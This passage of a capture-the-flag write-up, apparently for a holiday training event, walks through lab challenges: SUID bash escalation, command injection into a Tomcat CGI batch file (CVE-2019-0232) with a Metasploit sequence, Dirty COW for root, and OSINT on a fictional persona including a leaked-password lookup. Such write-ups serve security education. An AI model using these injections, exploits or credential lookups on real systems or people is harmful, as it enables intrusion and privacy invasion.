-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/10444/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/10444/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/10444/usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/10444/usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/10444/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            111K Jul 10 14:00 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jul 23 15:09 /snap/core/10444/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root             27K Sep 16 18:43 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             43K Sep 16 18:43 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            109K Nov 19 17:07 /snap/core/10444/usr/lib/snapd/snap-confine

```
* Bash having suid is very dangerous
* [gtfobins](https://gtfobins.github.io/gtfobins/bash/) writes that "If the [bash] binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges."
	* Thus, we can run `bash -p` to enter privileged mode, which gives us root

* Now we can `cd /root/` and `cat flag.txt` to get the flag: `thm{2fb10afe933296592}`

# Day 12
### IP
`10.10.72.67`

### nmap
`nmap -sC -sV 10.10.72.67 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 11:22 EST
Nmap scan report for 10.10.72.67
Host is up (0.16s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE            VERSION
3389/tcp open  ssl/ms-wbt-server?
5357/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8009/tcp open  ajp13              Apache Jserv (Protocol v1.3)
8080/tcp open  http               Apache Tomcat 9.0.17
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.51 seconds
```
* Apache has a webserver running on 8080
	* This shows us that its apache tomcat 9.0.17
### gobuster
`gobuster dir -u http://10.10.72.67:8080/ -w /usr/share/wordlists/dirb/common.txt`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.72.67:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/23 11:30:32 Starting gobuster

===============================================================
/docs (Status: 302)
/examples (Status: 302)
/favicon.ico (Status: 200)
/manager (Status: 302)
===============================================================
2020/12/23 11:31:55 Finished
===============================================================
```
### metasploit
* Now, I totally would have used metasploit for this, but the machine kept dying on me
```
1. msfconsole
2. search 2019-0232
3. use exploit/windows/http/tomcat_cgi_cmdlineargs
4. options
5. set RHOST 10.10.72.67
6. set LHOST tun0
7. run
8. ls
9. cat flag1.txt
```
### manual
* We know that ElfMcEager made a file called `elfwhacker.bat`
	* This is probably in the `/cgi-bin/` directory
	* We know the machine is probably windows since it's a `.bat` file
* Going to `http://10.10.72.67:8080/cgi-bin/elfwhacker.bat` shows us the output of his script
	* That means we can go to `http://10.10.72.67:8080/cgi-bin/elfwhacker.bat?&dir` to append the output of the `dir command`

* I opened burpsuite and turned on my proxy to intercept the request being made when this is sent to make it easier to play with commands
	* The following was my intercepted request:
```
GET /cgi-bin/elfwhacker.bat?&dir HTTP/1.1

Host: 10.10.72.67:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ca;q=0.8
Connection: close
```
* We can press `CTRL+R` to send to the repeater tab

* Clicking send shows us a file called `flag1.txt` in the same directory
* We can output that file by writing `GET /cgi-bin/elfwhacker.bat?&type flag1.txt HTTP/1.1` and then highlighting it before pressing `CTRL+U` to url encode it
	* This gives us the line: `GET /cgi-bin/elfwhacker.bat?&type+flag1.txt HTTP/1.1`
	* When clicking send, it gives us the flag: `thm{whacking_all_the_elves}`


# Day 13
### IP
`10.10.240.97`

### nmap
`nmap -sC -sV 10.10.240.97 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 12:03 EST
Nmap scan report for 10.10.240.97
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
23/tcp  open  telnet  Linux telnetd
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33238/udp   status
|   100024  1          38310/tcp6  status
|   100024  1          51693/tcp   status
|_  100024  1          60126/udp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds
```
* The machine is running telnet, which is [not secure](https://www.geeksforgeeks.org/difference-ssh-telnet/#:~:text=Telnet%20is%20not%20a%20secure,to%20get%20that%20important%20information.)

### telnet
* We can login with `telnet 10.10.173.218` and with the credentials that are printed for us

### dirty cow
* running `cat /etc/*release` shows us that the machine is running Ubtunu 12.04, which is vulnerable to dirty cow
* We can download the exploit from [here](https://github.com/FireFart/dirtycow/blob/master/dirty.c) and compile it with `gcc -pthread dirty.c -o dirty -lcrypt` as described in the comments
* Make the file executable with `chmod +x dirty` and run with `./dirty`
	* Once this is done, you might have to telnet in again (I did), but now you can log in with the user `firefart` and with the password that you set by typing `su firefart`
* Now we can `cd /root/`, `touch coal` (as per the instructions) and `tree | md5sum` to get the hash `8b16f00dd3b51efadb02c1df7f8427cc`


# Day 14
* We have a reddit username: `IGuidetheClaus2020`
* Let's take a look at https://reddit.com/u/IGuidetheClaus2020
	* [This](https://www.reddit.com/r/books/comments/jsvby8/chicago_public_library_says_eliminating_fines_has/gdjz4ef/?context=3) post says `Fun fact: I was actually born in Chicago and my creator's name was Robert!`

* We can look for other social media accounts with the same username with `sherlock IGuidetheClaus2020`
```
[*] Checking username IGuidetheClaus2020 on:
[+] 500px: https://500px.com/p/IGuidetheClaus2020
[+] Badoo: https://badoo.com/profile/IGuidetheClaus2020
[+] Pling: https://www.pling.com/u/IGuidetheClaus2020/
[+] Reddit: https://www.reddit.com/user/IGuidetheClaus2020
[+] Travellerspoint: https://www.travellerspoint.com/users/IGuidetheClaus2020
```	
* A couple of these are false positives... no major successes though
* However, we can still do some google searching
	* I typed `"IGuidetheClaus2020"` into google and found a [twitter account](https://twitter.com/iguideclaus2020?lang=en) with the username `IGuideClaus2020`
		* Looking through some posts we can see that:
			* Favorite show is `bachelorette`
			* Email is `rudolphthered@hotmail.com`
* [This](https://twitter.com/IGuideClaus2020/status/1331615839318138883) tweet on the account links to an [image](https://t.co/jmI66ZuNZI?amp=1)
	* We can download it with `wget "https://t.co/jmI66ZuNZI?amp=1" -O rudolphImage.jpeg`

* The tweet also says the image was taken outside a hotel, so maybe we can find a location with the exif data in the image
	* We can look at that with `exiftool rudolphImage.jpeg`. We get the following output:
```
ExifTool Version Number         : 12.09
File Name                       : rudolphImage.jpeg
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2020:11:25 10:07:43-05:00
File Access Date/Time           : 2020:12:24 13:33:42-05:00
File Inode Change Date/Time     : 2020:12:24 13:33:38-05:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 72
Y Resolution                    : 72
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Copyright                       : {FLAG}ALWAYSCHECKTHEEXIFD4T4
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : Hi. :)
Flashpix Version                : 0100
GPS Latitude Ref                : North
GPS Longitude Ref               : West
Image Width                     : 650
Image Height                    : 510
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 650x510
Megapixels                      : 0.332
GPS Latitude                    : 41 deg 53' 30.53" N
GPS Longitude                   : 87 deg 37' 27.40" W
GPS Position                    : 41 deg 53' 30.53" N, 87 deg 37' 27.40" W
```
* We get the flag: `{FLAG}ALWAYSCHECKTHEEXIFD4T4`
* We get a location: `1 deg 53' 30.53" N, 87 deg 37' 27.40" W` (or `41.891815, -87.624277`)
	* We can use [this](https://www.gps-coordinates.net/) website to get the street address: `Michigan Ave, 520 North Michigan Avenue, Chicago, IL 60611, United States of America`
		* This is where the parade was
	* A quick [google search](https://www.google.com/search?safe=active&sxsrf=ALeKk01BA1Df8hO6BuLH2DbYM8eypLBQ_g%3A1608835115269&ei=K-DkX-n4D5DH5gKFyIvIDQ&q=hotels+near+Michigan+Ave%2C+520+North+Michigan+Avenue%2C+Chicago%2C+IL+60611&oq=hotels+near+Michigan+Ave%2C+520+North+Michigan+Avenue%2C+Chicago%2C+IL+60611&gs_lcp=CgZwc3ktYWIQAzoECAAQRzoHCCMQsAIQJzoECAAQDToECCEQClDFCFj0FmCPGGgBcAJ4AIABc4gBxQqSAQQzLjEwmAEAoAEBqgEHZ3dzLXdpesgBCMABAQ&sclient=psy-ab&ved=0ahUKEwipurDsoeftAhWQo1kKHQXkAtkQ4dUDCA0&uact=5) shows us a couple nearby hotels
		* [This](https://twitter.com/IGuideClaus2020/status/1331625591649529857) post indicates that he's probably at the Marriott
		* [This[(https://www.google.com/travel/hotels/60611/entity/CgsIo56j1Ke577HQARAB?g2lb=2502548%2C2503780%2C4258168%2C4270442%2C4306835%2C4317915%2C4328159%2C4371334%2C4401769%2C4419364%2C4428793%2C4429192%2C4463263%2C4463666%2C4464463%2C4474862%2C4480320%2C4482194%2C4482438%2C4484375%2C4270859%2C4284970%2C4291517&hl=en-US&gl=us&un=1&ap=aAE&q=hotels%20near%20Michigan%20Ave%2C%20520%20North%20Michigan%20Avenue%2C%20Chicago%2C%20IL%2060611&rp=EMLHmPX6y_GvuAEQoben2Mv6-CYQ492Am5-4usaCARCjnqPUp7nvsdABOAJAAEgCwAEDyAEA&ictx=1&ved=0CAAQ5JsGahcKEwjohL6zo-ftAhUAAAAAHQAAAAAQAg&utm_campaign=sharing&utm_medium=link&utm_source=htls&hrf=CgUIyAEQACIDVVNEKhYKBwjkDxAMGB4SBwjkDxAMGB8YASgAWAGSAQIgAQ) hotel at `540 N Michigan Ave, Chicago, IL 60611` matches the description
 

* Looking up `"robert" "rudolph" "chigao"` on google, we find [this](https://en.wikipedia.org/wiki/Robert_L._May) wikipedia page
	* Looks like Rudolph was quite literally invented by `Robert L. May`

* We can look for leaked credentials at `https://scylla.sh/search?q=email:rudolphthered@hotmail.com`, which gives us the password `spygame`

# Day 15
* We can get the solutions for the problems by trying them ourselves in the python interpreter by typing `python3` in the terminal (if needed)

* `True + True` evaluates to `2` because python treats true as 1

* `pypi` is the database for installing python libraries

* `bool("False") evaluates to true because the string "False" is being cast as a boolean. In this case, python will make anything that equals 0 evaluate to false, and everything else true

* the `requests` module is one way that you can download the html of a webpage

```python3
x = [1, 2, 3]

y = x

y.append(6)

print(x)
```
* The above code evaluates to `[1, 2, 3, 6]` because python passes by reference by default, which means setting values equal to eachother is actually setting the address they point to to the same thing


# Day 16

# Day 17

# Day 18

# Day 19

# Day 20
